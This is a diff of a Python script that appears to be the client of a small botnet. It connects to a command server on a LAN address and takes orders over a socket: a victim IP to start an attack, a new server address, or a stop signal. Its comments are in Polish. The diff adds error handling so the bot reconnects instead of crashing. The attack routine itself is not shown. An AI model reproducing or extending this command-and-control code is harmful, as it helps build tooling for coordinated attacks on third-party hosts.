@@ -97,7 +97,7 @@ def checkForOtherDevices(ip, victimIP):
 
 if __name__ == '__main__':
 
-    HOST = '127.0.0.1'  # The server's hostname or IP address
+    HOST = '192.168.100.11'  # The server's hostname or IP address
     PORT = 65432  # The port used by the server
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -124,30 +124,33 @@ if __name__ == '__main__':
                     continue
                 time.sleep(1)
                 print("Connection established!")
+            try:
+                data = str(s.recv(1).decode())
+                print('Received', str(data))
+                if str(data) == '1':
 
-            data = str(s.recv(1).decode())
-            print('Received', str(data))
-            if str(data) == '1':
+                    victim_ip = str(s.recv(1024).decode())
+                    print('victim address:' + str(victim_ip))
+                    checkForOtherDevices(HOST, victim_ip)
+                    attack = True
+                elif data == 2:  # dostan nowe ip serwera
 
-                victim_ip = str(s.recv(1024).decode())
-                print('victim address:' + str(victim_ip))
-                checkForOtherDevices(HOST, victim_ip)
-                attack = True
-            elif data == 2:  # dostan nowe ip serwera
+                    HOST = s.recv(1024)
+                    s.close()
+                    flag = 0
+                    continue
+                else:
+                    print('something went wrong')
 
-                HOST = s.recv(1024)
-                s.close()
-                flag = 0
-                continue
-            else:
-                print('something went wrong')
-
-            # zrobić try zeby sie nie wywalilo
-            stop = str(s.recv(1).decode())
-            if stop == '0':
-                attack = False
-                print("Stoping")
-            time.sleep(5)
+                # zrobić try zeby sie nie wywalilo
+                stop = str(s.recv(1).decode())
+                if stop == '0':
+                    attack = False
+                    print("Stoping")
+                    flag=0
+                time.sleep(5)
+            except:
+                flag=0
             # ip = get('https://api.ipify.org').text
             # print('public IP address: {}'.format(ip))
             # print('operating port: {}'.format(PORT))
